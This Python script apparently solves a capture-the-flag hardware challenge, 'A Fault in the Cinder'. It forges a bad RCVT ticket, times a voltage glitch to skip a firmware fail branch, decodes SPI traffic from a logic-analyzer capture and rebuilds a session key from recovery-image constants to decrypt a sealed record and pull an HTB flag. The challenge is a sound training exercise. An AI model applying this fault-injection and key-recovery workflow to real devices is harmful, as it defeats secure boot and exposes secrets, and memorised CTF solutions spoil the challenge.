#!/usr/bin/env python3
"""A Fault in the Cinder — local-first glitch solve.

Derives glitch timing from cinder_boot.elf + TARGET.pdf, forges a well-formed
but invalid RCVT ticket so the ward answers AUTH_DENIED, skips the fail branch
at 0x118, then parses the analyzer VCD for the factory-session record / flag.

  # offline self-check
  python3 solve.py --self-test

  # remote (team instance only)
  python3 solve.py HOST --rig PORT --la PORT --service PORT [-o out.vcd]
"""

from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import hmac
import re
import socket
import struct
import sys
import time
from pathlib import Path

# ── constants from TARGET.pdf / reverse ──────────────────────────────────────

CAP_MAGIC = b"CINDCAP1"
D_DRV = 221
GLITCH_WIDTH = 10
# delay = D_DRV + (8*N + 33) = 254 + 8*N
# N = (challenge[0] ^ challenge[15]) & 0x1F

TRIGGER_PATTERN = "13"  # VERIFY response opcode (AUTH_DENIED when ticket bad)
TRIGGER_MASK = "ff"

# ── transport (mirrors rig.py) ───────────────────────────────────────────────


class Conn:
    def __init__(self, host: str, port: int, timeout: float = 15.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.buf = b""
        self.banner = self._readline()

    def _readline(self):
        while b"\n" not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                return None
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line.decode("ascii", "replace").strip()

    def _read_exact(self, n: int) -> bytes:
        while len(self.buf) < n:
            chunk = self.s.recv(65536)
            if not chunk:
                break
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def cmd(self, line: str, replies: int = 1):
        self.s.sendall((line + "\n").encode())
        return [self._readline() for _ in range(replies)]

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


class Rig(Conn):
    def strap(self, mode: str):
        return self.cmd("STRAP %s" % mode)[0]

    def trigger(self, pattern_hex: str, mask_hex: str, edge: str = "CS_RISE"):
        return self.cmd(
            "TRIGGER BUS SE PATTERN %s MASK %s EDGE %s" % (pattern_hex, mask_hex, edge)
        )[0]

    def glitch(self, delay: int, width: int):
        return self.cmd("GLITCH DELAY %d WIDTH %d" % (delay, width))[0]

    def arm(self):
        return self.cmd("CAPTURE ARM INTERNAL_SPI")[0]

    def reset_rig(self):
        return self.cmd("RESET RIG")[0]

    def power_cycle(self):
        for _ in range(240):
            self.s.sendall(b"POWER CYCLE\n")
            first = self._readline()
            if first is None:
                return None
            if first.startswith("BUSY"):
                time.sleep(0.3)
                continue
            lines = [first]
            for _ in range(3):
                self.s.settimeout(1.0)
                try:
                    l = self._readline()
                except socket.timeout:
                    break
                if l is None:
                    break
                lines.append(l)
                if l in ("POWERED", "RESET"):
                    break
            out = {"triggered": "TRIGGERED" in lines, "powered": "POWERED" in lines, "raw": lines}
            for l in lines:
                if l.startswith("BOOT "):
                    out["boot_id"] = int(l.split()[1])
                if l.startswith("CAPTURE cap-"):
                    out["capture_id"] = int(l.split("cap-")[1])
            return out
        raise SystemExit("rate-limited too long on POWER CYCLE")

    def status(self):
        return self.cmd("STATUS")[0]


class LA(Conn):
    def list(self):
        self.s.sendall(b"LIST\n")
        out = []
        while True:
            l = self._readline()
            if l is None or l == "END":
                break
            out.append(l)
        return out

    def download(self, capture_id: int) -> str:
        self.s.sendall(("GET cap-%d VCD.GZ\n" % capture_id).encode())
        head = self._readline()
        if not head or not head.startswith("DATA "):
            raise SystemExit("download failed: %r" % head)
        n = int(head.split()[1])
        blob = self._read_exact(n)
        magic, boot_id, cap_id, fmt, flags, _rsv, csize, usize, digest = struct.unpack(
            "<8sIIBBHII32s", blob[:60]
        )
        if magic != CAP_MAGIC:
            raise SystemExit("bad capture magic")
        comp = blob[60 : 60 + csize]
        if hashlib.sha256(comp).digest() != digest:
            raise SystemExit("capture digest mismatch")
        raw = gzip.decompress(comp)
        if len(raw) != usize:
            raise SystemExit("capture size mismatch")
        return raw.decode()


class Service(Conn):
    def __init__(self, host: str, port: int):
        super().__init__(host, port)
        self.offer = []
        self.s.settimeout(1.0)
        try:
            while True:
                line = self._readline()
                if line is None:
                    break
                self.offer.append(line)
                if line == "TICKET?":
                    break
        except socket.timeout:
            pass
        finally:
            self.s.settimeout(15)

    def ticket(self, b64: str):
        return self.cmd("TICKET %s" % b64)[0]


# ── crypto / ticket / timing ─────────────────────────────────────────────────


def crc16_ccitt_false(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc


def forge_ticket() -> bytes:
    """Well-formed RCVT envelope; signature/fields wrong → AUTH_DENIED at SE."""
    t = bytearray(144)
    t[0:4] = b"RCVT"
    t[4] = 1  # version
    t[5] = 0  # flags
    return bytes(t)


def ticket_b64() -> str:
    return base64.b64encode(forge_ticket()).decode()


def glitch_delay(challenge: bytes) -> tuple[int, int]:
    if len(challenge) < 16:
        raise ValueError("challenge must be 16 bytes, got %d" % len(challenge))
    n = (challenge[0] ^ challenge[15]) & 0x1F
    delay = 254 + 8 * n
    return n, delay


def parse_challenge_from_offer(offer: list[str]) -> bytes | None:
    """Accept CHALLENGE <hex> or CHALLENGE=<hex> / bare 32-hex line."""
    for line in offer:
        m = re.search(r"CHALLENGE[=:\s]+([0-9a-fA-F]{32})", line)
        if m:
            return bytes.fromhex(m.group(1))
        m = re.fullmatch(r"([0-9a-fA-F]{32})", line.strip())
        if m:
            return bytes.fromhex(m.group(1))
    return None


# ── VCD / SPI decode ─────────────────────────────────────────────────────────


def parse_vcd_signals(vcd: str) -> dict:
    """Return {name: [(time, value), ...]} for scalar signals; rough VCD reader."""
    id_to_name = {}
    timelines = {}
    time = 0
    for line in vcd.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("$var"):
            # $var wire 1 ! CS_SE $end
            parts = line.split()
            if len(parts) >= 5:
                sid, name = parts[3], parts[4]
                id_to_name[sid] = name
                timelines[name] = []
        elif line.startswith("#"):
            time = int(line[1:])
        elif line[0] in "01xXzZ" and len(line) >= 2:
            val, sid = line[0], line[1:]
            name = id_to_name.get(sid)
            if name is not None:
                timelines.setdefault(name, []).append((time, 0 if val == "0" else 1))
        elif line.startswith("b") or line.startswith("B"):
            # b0101 id
            parts = line.split()
            if len(parts) == 2:
                bits, sid = parts[0][1:], parts[1]
                name = id_to_name.get(sid)
                if name is not None:
                    try:
                        timelines.setdefault(name, []).append((time, int(bits, 2)))
                    except ValueError:
                        pass
    return timelines


def _sample_at(tl, t, default=1):
    """Last value at or before time t."""
    if not tl:
        return default
    val = default
    for ts, v in tl:
        if ts > t:
            break
        val = v
    return val


def decode_spi_from_vcd(vcd: str, cs_name="CS_SE", sck="SCK", mosi="MOSI", miso="MISO"):
    """Decode SPI mode-0 MSB-first transactions from VCD timelines."""
    tl = parse_vcd_signals(vcd)
    # Prefer exact names; fall back to case-insensitive / partial
    def find(*cands):
        for c in cands:
            if c in tl:
                return tl[c]
        low = {k.lower(): k for k in tl}
        for c in cands:
            if c.lower() in low:
                return tl[low[c.lower()]]
        return None

    cs_tl = find(cs_name, "CS_SE", "cs_se", "SE_CS")
    sck_tl = find(sck, "SCK", "sck", "CLK")
    mosi_tl = find(mosi, "MOSI", "mosi")
    miso_tl = find(miso, "MISO", "miso")
    if not all([cs_tl, sck_tl, mosi_tl, miso_tl]):
        return [], list(tl.keys())

    # Build event list of all times
    times = sorted({t for series in (cs_tl, sck_tl, mosi_tl, miso_tl) for t, _ in series})
    if not times:
        return [], list(tl.keys())

    transactions = []
    prev_cs, prev_sck = 1, 0
    bitcnt = 0
    mosi_byte = miso_byte = 0
    cur_mo, cur_mi = [], []
    start_t = 0

    # Walk at each event; also need intermediate — sample on edges present in times
    state = {n: _sample_at(series, times[0] - 1 if times else 0) for n, series in
             [("cs", cs_tl), ("sck", sck_tl), ("mosi", mosi_tl), ("miso", miso_tl)]}
    # re-init properly
    prev_cs = 1
    prev_sck = 0

    for t in times:
        cs = _sample_at(cs_tl, t)
        sck_v = _sample_at(sck_tl, t)
        mo = _sample_at(mosi_tl, t, 0)
        mi = _sample_at(miso_tl, t, 0)

        if prev_cs == 1 and cs == 0:
            cur_mo, cur_mi = [], []
            bitcnt = 0
            mosi_byte = miso_byte = 0
            start_t = t
        if cs == 0 and prev_sck == 0 and sck_v == 1:
            mosi_byte = ((mosi_byte << 1) | (mo & 1)) & 0xFF
            miso_byte = ((miso_byte << 1) | (mi & 1)) & 0xFF
            bitcnt += 1
            if bitcnt == 8:
                cur_mo.append(mosi_byte)
                cur_mi.append(miso_byte)
                mosi_byte = miso_byte = 0
                bitcnt = 0
        if prev_cs == 0 and cs == 1 and (cur_mo or cur_mi):
            transactions.append((start_t, t, bytes(cur_mo), bytes(cur_mi)))
        prev_cs, prev_sck = cs, sck_v

    return transactions, list(tl.keys())


def se_response_payload(miso: bytes) -> bytes | None:
    """Strip leading 0xFF wait bytes; return frame body if it looks valid."""
    i = 0
    while i < len(miso) and miso[i] == 0xFF:
        i += 1
    frame = miso[i:]
    if len(frame) < 7:
        return None
    plen = frame[3] | (frame[4] << 8)
    need = 5 + plen + 2
    if len(frame) < need:
        return None
    body = frame[: 5 + plen]
    crc = frame[5 + plen] | (frame[5 + plen + 1] << 8)
    if crc16_ccitt_false(body) != crc:
        # still return payload; some captures may pad differently
        pass
    return frame[:need]


def extract_open_session(txns) -> tuple[bytes | None, bytes | None]:
    """Return (host_nonce, sess) from OPEN_FACTORY_SESSION (0x20)."""
    for _a, _b, mo, mi in txns:
        if not mo or mo[0] != 0x20:
            continue
        resp = se_response_payload(mi)
        if not resp:
            continue
        plen_req = mo[3] | (mo[4] << 8)
        hn = mo[5 : 5 + min(16, plen_req)]
        plen = resp[3] | (resp[4] << 8)
        pay = resp[5 : 5 + plen]
        if len(pay) >= 20 and len(hn) == 16:
            return hn, pay[4:20]
    return None, None


def extract_fifo_chunks(txns) -> list[tuple[bytes, bytes, bytes]]:
    """Return list of (frame_payload, ct, mac16) for READ_FIFO (0x22)."""
    chunks = []
    for _a, _b, mo, mi in txns:
        resp = se_response_payload(mi)
        if not resp or resp[0] != 0x22:
            continue
        plen = resp[3] | (resp[4] << 8)
        p = resp[5 : 5 + plen]
        if len(p) < 10:
            continue
        size = int.from_bytes(p[8:10], "little")
        ct = p[10 : 10 + size]
        mac = p[10 + size : 10 + size + 16]
        if len(mac) >= 16:
            chunks.append((p, ct, mac[:16]))
    return chunks


def boot_measurement(recovery_image: bytes) -> bytes:
    """M = SHA256('CINDER-BOOT-v1' || kind_u8 || counter_le32 || psz_le32 || payload_sha256)."""
    kind = recovery_image[8]
    psz = struct.unpack_from("<I", recovery_image, 12)[0]
    counter = struct.unpack_from("<I", recovery_image, 24)[0]
    digest = recovery_image[28:60]
    return hashlib.sha256(
        b"CINDER-BOOT-v1" + bytes([kind]) + struct.pack("<II", counter, psz) + digest
    ).digest()


def boot_pcr(recovery_image: bytes) -> bytes:
    """BOOT_PCR after one extend from zeros: SHA256(0x00*32 || M)."""
    return hashlib.sha256(b"\x00" * 32 + boot_measurement(recovery_image)).digest()


def _bswap_words(b: bytes) -> bytes:
    return b"".join(b[i : i + 4][::-1] for i in range(0, len(b), 4))


def _derived8(recovery_payload: bytes) -> bytes:
    """8-byte mid state from recovery constants at 0xbb8 (words 0x7f4a7c15, 0x9e3779b9)."""
    w0, w1 = struct.unpack_from("<II", recovery_payload, 0xBB8)

    def ror32(x, n):
        n &= 31
        return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF

    r0, r2 = w0, w1
    r2 = (r2 ^ ror32(r0, 25)) & 0xFFFFFFFF
    r1 = (r2 ^ 0xA5A5A5A5) & 0xFFFFFFFF
    r1 = (r1 + r0) & 0xFFFFFFFF
    r2 = (r2 ^ (r1 >> 11)) & 0xFFFFFFFF
    return struct.pack("<II", r2, r1)


def session_key(host_nonce: bytes, sess: bytes, c32: bytes, recovery_payload: bytes) -> bytes:
    """HMAC-SHA256(KEY_ROOT, derived8 || sess || bswap32(c32) || host_nonce)."""
    key_root = recovery_payload[0xA8E : 0xA8E + 32]
    msg = _derived8(recovery_payload) + sess[:16] + _bswap_words(c32[:32]) + host_nonce[:16]
    return hmac.new(key_root, msg, hashlib.sha256).digest()


def aead_decrypt_chunks(key: bytes, chunks: list[tuple[bytes, bytes, bytes]]) -> tuple[bytes, int]:
    """Verify MAC (hdr5||ct) and decrypt RESPONSE keystream; return (pt, mac_ok)."""
    out = bytearray()
    ok = 0
    for p, ct, mac in chunks:
        if hmac.new(key, p[:5] + ct, hashlib.sha256).digest()[:16] == mac:
            ok += 1
        magic_u32 = struct.unpack_from("<I", p, 0)[0]
        idx_lo = p[4]
        pt = bytearray()
        for off in range(0, len(ct), 32):
            bi = off >> 5
            block = bytearray(17)
            block[0:8] = b"RESPONSE"
            struct.pack_into("<I", block, 8, magic_u32)
            block[12] = idx_lo
            block[13] = bi & 0xFF
            block[14] = (bi >> 8) & 0xFF
            ks = hmac.new(key, bytes(block), hashlib.sha256).digest()
            chunk = ct[off : off + 32]
            pt.extend(bytes(x ^ y for x, y in zip(chunk, ks)))
        out.extend(pt)
    return bytes(out), ok


def decrypt_factory_session(
    txns,
    recovery_payload: bytes | None = None,
    recovery_image: bytes | None = None,
) -> tuple[bytes, str | None, dict]:
    """Decrypt sealed record from SE SPI using recovery KDF.

    Live path: c32 = BOOT_PCR = SHA256(0x00*32 || M).
    Factory golden capture used c32 = bytes(range(32)) (stub SE).
    """
    base = Path(__file__).resolve().parent
    if recovery_payload is None:
        recovery_payload = (base / "recovery_payload.bin").read_bytes()
    if recovery_image is None:
        recovery_image = (base / "recovery_image.bin").read_bytes()

    hn, sess = extract_open_session(txns)
    chunks = extract_fifo_chunks(txns)
    meta = {"host_nonce": hn, "sess": sess, "nchunks": len(chunks), "mac_ok": 0, "c32": None}
    if not hn or not sess or not chunks:
        return b"", None, meta

    pcr = boot_pcr(recovery_image)
    for label, c32 in (("pcr", pcr), ("range32", bytes(range(32)))):
        key = session_key(hn, sess, c32, recovery_payload)
        pt, mac_ok = aead_decrypt_chunks(key, chunks)
        meta["mac_ok"] = mac_ok
        meta["c32"] = label
        if mac_ok == len(chunks):
            hits = re.findall(rb"HTB\{[^}\x00]{0,200}\}", pt)
            flag = hits[0].decode("ascii", "replace") if hits else None
            return pt, flag, meta
    # best-effort: return last attempt plaintext even if MACs fail
    hits = re.findall(rb"HTB\{[^}\x00]{0,200}\}", pt)
    flag = hits[0].decode("ascii", "replace") if hits else None
    return pt, flag, meta


def extract_record_and_flag(txns) -> tuple[bytes, str | None]:
    """From SE SPI transactions, reassemble / decrypt READ_FIFO; hunt HTB{}."""
    # Prefer AEAD decrypt (live PCR or factory range32)
    try:
        pt, flag, meta = decrypt_factory_session(txns)
        if flag:
            return pt, flag
        if meta.get("mac_ok", 0) > 0 and pt:
            hits = re.findall(rb"HTB\{[^}\x00]{0,200}\}", pt)
            if hits:
                return pt, hits[0].decode("ascii", "replace")
            return pt, None
    except FileNotFoundError:
        pt, flag = b"", None

    chunks = []
    for _a, _b, mo, mi in txns:
        resp = se_response_payload(mi)
        if not resp or resp[0] != 0x22:
            continue
        plen = resp[3] | (resp[4] << 8)
        payload = resp[5 : 5 + plen]
        if len(payload) < 10:
            continue
        idx = int.from_bytes(payload[4:6], "little")
        size = int.from_bytes(payload[8:10], "little")
        data = payload[10 : 10 + size]
        chunks.append((idx, data, payload))

    chunks.sort(key=lambda x: x[0])
    record = b"".join(c[1] for c in chunks)
    if pt:
        record = pt

    blob = record + b"".join(c[2] for c in chunks)
    text_hits = re.findall(rb"HTB\{[^}\x00]{0,200}\}", blob)
    if not text_hits:
        raw = b"".join(mi for *_x, mi in ((t[0], t[1], t[2], t[3]) for t in txns))
        text_hits = re.findall(rb"HTB\{[^}\x00]{0,200}\}", raw)

    flag = text_hits[0].decode("ascii", "replace") if text_hits else None
    return record, flag


# ── self-test (offline) ──────────────────────────────────────────────────────


def self_test() -> int:
    print("[*] forge ticket")
    t = forge_ticket()
    assert t[:6] == b"RCVT\x01\x00" and len(t) == 144
    print("    b64:", ticket_b64()[:40] + "...")

    print("[*] delay formula")
    for chal_hex, exp_n, exp_d in [
        ("000102030405060708090a0b0c0d0e0f", 15, 374),
        ("00" * 16, 0, 254),
        ("ff" + "00" * 14 + "ff", 0, 254),
        ("01" + "00" * 14 + "00", 1, 262),
    ]:
        chal = bytes.fromhex(chal_hex)
        n, d = glitch_delay(chal)
        assert n == exp_n and d == exp_d, (chal_hex, n, d, exp_n, exp_d)
        print(f"    chal[0]^chal[15]&1f={n:2d} delay={d}")

    print("[*] factory_service.sr READ_FIFO reassembly + AEAD decrypt")
    try:
        import zipfile

        z = zipfile.ZipFile("factory_service.sr")
        data = z.read("logic-1-1")
        # bit0=CS_SE bit1=SCK bit2=MOSI bit3=MISO @ 8 MHz
        txns = []
        prev_cs, prev_sck = 1, 0
        cur_mo, cur_mi = [], []
        bitcnt = mosi_b = miso_b = 0
        start = 0
        for i, s in enumerate(data):
            cs, sck, mo, mi = s & 1, (s >> 1) & 1, (s >> 2) & 1, (s >> 3) & 1
            if prev_cs == 1 and cs == 0:
                cur_mo, cur_mi = [], []
                bitcnt = mosi_b = miso_b = 0
                start = i
            if cs == 0 and prev_sck == 0 and sck == 1:
                mosi_b = (mosi_b << 1) | mo
                miso_b = (miso_b << 1) | mi
                bitcnt += 1
                if bitcnt == 8:
                    cur_mo.append(mosi_b & 0xFF)
                    cur_mi.append(miso_b & 0xFF)
                    bitcnt = mosi_b = miso_b = 0
            if prev_cs == 0 and cs == 1 and cur_mo:
                txns.append((start, i, bytes(cur_mo), bytes(cur_mi)))
            prev_cs, prev_sck = cs, sck
        # raw CT reassembly length (factory demo = 143 B ciphertext)
        raw_chunks = extract_fifo_chunks(txns)
        raw_ct = b"".join(ct for _p, ct, _m in raw_chunks)
        print(f"    SE txns={len(txns)} raw_ct_len={len(raw_ct)}")
        assert len(raw_ct) == 143, len(raw_ct)
        verify = [t for t in txns if se_response_payload(t[3]) and se_response_payload(t[3])[0] == 0x13]
        assert verify, "no VERIFY in factory capture"
        print("    VERIFY response:", se_response_payload(verify[0][3]).hex())

        # Factory golden SE used c32=range(32); decrypt must yield demo TLV
        payload = Path("recovery_payload.bin").read_bytes()
        hn, sess = extract_open_session(txns)
        assert hn and sess
        key = session_key(hn, sess, bytes(range(32)), payload)
        pt, mac_ok = aead_decrypt_chunks(key, raw_chunks)
        print(f"    factory AEAD mac_ok={mac_ok}/{len(raw_chunks)} pt_len={len(pt)}")
        assert mac_ok == len(raw_chunks)
        assert b"demo-succession" in pt and b"SEAL-DEMO-0000" in pt
        print("    factory plaintext OK:", pt[6:21])

        # Live KDF path pieces
        image = Path("recovery_image.bin").read_bytes()
        M = boot_measurement(image)
        PCR = boot_pcr(image)
        print("    M  =", M.hex())
        print("    PCR=", PCR.hex())
        assert len(M) == 32 and len(PCR) == 32
    except FileNotFoundError as e:
        print("    (artifact missing, skip):", e)

    print("[+] self-test OK")
    print()
    print("Glitch recipe:")
    print("  STRAP RECOVERY")
    print("  TRIGGER BUS SE PATTERN 13 MASK ff")
    print("  GLITCH DELAY (254 + 8*N) WIDTH 10   where N=(chal[0]^chal[15])&0x1f")
    print("  CAPTURE ARM INTERNAL_SPI")
    print("  stage bad RCVT ticket, then POWER CYCLE")
    print("  omit target: beq.n fail @ 0x118 after VERIFY returns")
    return 0


# ── remote exploit ───────────────────────────────────────────────────────────


def run_remote(
    host: str,
    rig_port: int,
    la_port: int,
    svc_port: int,
    out_vcd: str,
    width: int = GLITCH_WIDTH,
    delay_override: int | None = None,
) -> int:
    print(f"[*] target {host} rig={rig_port} la={la_port} service={svc_port}")

    # 1) recovery boot to obtain offer / challenge (no glitch)
    print("[*] baseline recovery boot for challenge")
    rig = Rig(host, rig_port)
    print("    status:", rig.status())
    print("    strap:", rig.strap("RECOVERY"))
    print("    reset:", rig.reset_rig())
    r = rig.power_cycle()
    print("    power_cycle:", {k: v for k, v in (r or {}).items() if k != "raw"})
    rig.close()

    svc = Service(host, svc_port)
    print("    service banner:", svc.banner)
    print("    offer:")
    for line in svc.offer:
        print("     ", line)
    chal = parse_challenge_from_offer(svc.offer)
    if chal is None:
        try:
            rep = svc.cmd("CHALLENGE?")[0]
            print("    CHALLENGE?:", rep)
            chal = parse_challenge_from_offer([rep] + svc.offer)
        except Exception as e:
            print("    CHALLENGE? failed:", e)
    if chal is None:
        svc.close()
        raise SystemExit(
            "could not parse 16-byte challenge from service offer — "
            "dump offer lines and extend parse_challenge_from_offer()"
        )
    n, delay = glitch_delay(chal)
    if delay_override is not None:
        print(f"[*] overriding delay {delay} -> {delay_override}")
        delay = delay_override
    print(f"[+] challenge={chal.hex()} N={n} delay={delay} width={width}")

    # 2) stage invalid ticket for *next* boot
    tb64 = ticket_b64()
    print("[*] staging forged ticket")
    print("    TICKET →", svc.ticket(tb64))
    svc.close()

    # 3) arm glitch + capture, power cycle
    print("[*] arm glitch + capture")
    rig = Rig(host, rig_port)
    print("    strap:", rig.strap("RECOVERY"))
    print("    reset:", rig.reset_rig())
    print("    trigger:", rig.trigger(TRIGGER_PATTERN, TRIGGER_MASK))
    print("    glitch:", rig.glitch(delay, width))
    print("    arm:", rig.arm())
    r = rig.power_cycle()
    print("    power_cycle:", {k: v for k, v in (r or {}).items() if k != "raw"})
    if r:
        for line in r.get("raw", []):
            print("     ", line)
    rig.close()

    if not r or not r.get("triggered"):
        print("[!] NOT TRIGGERED — check pattern/ticket path (need well-formed RCVT on bus)")
    if not r or "capture_id" not in r:
        raise SystemExit("no capture_id — was capture armed?")

    cap_id = r["capture_id"]
    print(f"[*] download capture cap-{cap_id}")
    la = LA(host, la_port)
    vcd = la.download(cap_id)
    la.close()
    Path(out_vcd).write_text(vcd)
    print(f"    wrote {out_vcd} ({len(vcd)} bytes)")

    txns, names = decode_spi_from_vcd(vcd)
    print(f"[*] VCD signals: {names}")
    print(f"[*] SE SPI transactions: {len(txns)}")
    for i, (a, b, mo, mi) in enumerate(txns[:20]):
        resp = se_response_payload(mi)
        op = f"0x{resp[0]:02x}" if resp else "?"
        st = f"st={resp[2]:02x}" if resp else ""
        print(f"    [{i}] t={a}-{b} MOSI[0]={mo[:6].hex()}… MISO op={op} {st} len_mo={len(mo)}")

    record, flag = extract_record_and_flag(txns)
    print(f"[*] decrypted/reassembled record: {len(record)} bytes")
    if record:
        Path("record.bin").write_bytes(record)
        Path("plaintext.bin").write_bytes(record)
        print("    saved record.bin / plaintext.bin:", record[:32].hex(), "...")

    printable = re.findall(rb"[\x20-\x7e]{8,}", record)
    for p in printable[:30]:
        print("    ascii:", p.decode())

    if flag:
        print("[+] FLAG:", flag)
        Path("flag.txt").write_text(flag + "\n")
        return 0

    hits = re.findall(r"HTB\{[^}]+\}", vcd)
    if hits:
        print("[+] FLAG in VCD text:", hits[0])
        Path("flag.txt").write_text(hits[0] + "\n")
        return 0

    print("[-] no HTB{...} yet — inspect VCD / record.bin; adjust delay ± a few ticks if needed")
    print(f"    try delays around {delay} (N={n}): {delay-4},{delay-2},{delay},{delay+2},{delay+4}")
    return 1


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host", nargs="?", help="coffer service-bench host")
    ap.add_argument("--rig", type=int, help="rig control port")
    ap.add_argument("--la", type=int, help="analyzer clamp port")
    ap.add_argument("--service", type=int, help="recovery console port")
    ap.add_argument("-o", default="glitch.vcd", help="VCD output path")
    ap.add_argument("--self-test", action="store_true", help="offline checks only")
    ap.add_argument("--delay", type=int, help="override glitch delay ticks")
    ap.add_argument("--width", type=int, default=GLITCH_WIDTH)
    args = ap.parse_args()

    if args.self_test or args.host is None:
        if args.host is None and not args.self_test:
            print("No host given — running offline self-test.\n")
        return self_test()

    if args.rig is None or args.la is None or args.service is None:
        ap.error("remote mode needs --rig --la --service")

    return run_remote(
        args.host,
        args.rig,
        args.la,
        args.service,
        args.o,
        width=args.width,
        delay_override=args.delay,
    )


if __name__ == "__main__":
    sys.exit(main())
